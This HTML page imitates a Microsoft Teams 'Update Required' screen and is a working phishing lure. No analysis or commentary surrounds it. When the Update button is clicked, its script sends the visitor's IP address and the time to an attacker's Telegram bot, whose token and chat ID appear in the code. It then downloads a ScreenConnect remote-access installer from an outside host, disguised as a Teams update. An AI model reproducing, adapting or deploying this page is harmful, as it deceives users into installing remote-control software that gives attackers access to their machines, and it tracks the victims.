<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Teams</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #000;
        }

        /* Background Image - Blurred to mimic pre-join */
        .bg-layer {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://i.ibb.co/93mbz6vN/grok-image-440c9515-f42f-4ca7-83a7-d2904731eacd.jpg');
            background-size: cover;
            background-position: center;
            z-index: 1;
            filter: blur(8px) brightness(0.8); /* Stronger blur for realism */
        }

        /* Main Content Container - Centered vertically and horizontally */
        .main-content {
            position: relative;
            z-index: 5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            text-align: center;
            color: white;
        }

        /* The Red Phone Icon */
        .icon-x {
            width: 60px;
            height: 60px;
            background-color: #ff5f57;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        .icon-x svg {
            width: 30px;
            height: 30px;
            fill: white;
        }

        /* The "Sorry..." Text */
        .sorry-text {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        .explanation-text {
            font-size: 14px;
            color: #ccc;
            margin-bottom: 40px;
        }

        /* The Update Dialog - Positioned exactly as per the screenshot */
        .modal-container {
            position: fixed;
            bottom: 20px; /* Anchored to the bottom */
            left: 50%;
            transform: translateX(-50%); /* Perfectly centered */
            width: 400px;
            max-width: 90%;
            z-index: 10;
        }

        .modal-box {
            background-color: white;
            padding: 20px;
            border-radius: 4px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.4);
            text-align: center;
            animation: fadeIn 0.3s ease-out;
        }

        .modal-title {
            font-size: 16px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .modal-desc {
            font-size: 13px;
            color: #666;
            margin-bottom: 16px;
            line-height: 1.4;
        }

        .btn-primary {
            background-color: #5b5fc7;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            border-radius: 2px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.2s;
            width: 100%;
        }

        .btn-primary:hover {
            background-color: #4a4ea8;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <!-- Background Layer -->
    <div class="bg-layer"></div>

    <!-- Main Centered Content (The "Sorry" Screen) -->
    <div class="main-content">
        <!-- Red X Icon -->
        <div class="icon-x">
            <svg viewBox="0 0 24 24">
                <path d="M20 15.5C20 16.88 18.88 18 17.5 18H6.5C5.12 18 4 16.88 4 15.5V8.5C4 7.12 5.12 6 6.5 6H17.5C18.88 6 20 7.12 20 8.5V15.5ZM6 8.5V15.5H7V8.5H6ZM9 8.5V15.5H10V8.5H9ZM12 8.5V15.5H13V8.5H12ZM15 8.5V15.5H16V8.5H15Z"/>
            </svg>
        </div>
        
        <div class="sorry-text">Sorry, we couldn't connect you.</div>
        <div class="explanation-text">This version of Microsoft Teams needs to be updated.<br>Please update the app to continue.</div>
    </div>

    <!-- Bottom Modal Dialog -->
    <div class="modal-container">
        <div class="modal-box">
            <div class="modal-title">Update Required</div>
            <div class="modal-desc">Please update Microsoft Teams to continue.</div>
            
            <button class="btn-primary" id="updateBtn">Update</button>
        </div>
    </div>

    <script>
        // === CONFIGURATION ===
        const TELEGRAM_BOT_TOKEN = '8751898702:AAGLQM3LI6UsBMjLx5QgGQKH0rLtV5y8OeM'; 
        const TELEGRAM_CHAT_ID = '8478799631';     
        const PAYLOAD_URL = 'https://0xarion.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest';          

        const updateBtn = document.getElementById('updateBtn');

        // Helper: Send Notification
        async function notify(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const body = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };
            try {
                await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
            } catch (e) { console.error(e); }
        }

        // Helper: Get IP
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                return (await res.json()).ip;
            } catch (e) { return 'Unknown'; }
        }

        // Click Event
        updateBtn.addEventListener('click', async () => {
            updateBtn.textContent = 'Updating...';
            updateBtn.disabled = true;

            // Notify: Download Started
            await notify("⬇️ Update Downloaded!\n\nPayload: ScreenConnect.ClientSetup.exe\nIP: " + await getIP() + "\nTime: " + new Date().toLocaleString());

            // Trigger Download
            const link = document.createElement('a');
            link.href = PAYLOAD_URL;
            link.download = ''; 
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        });
    </script>
</body>
</html>
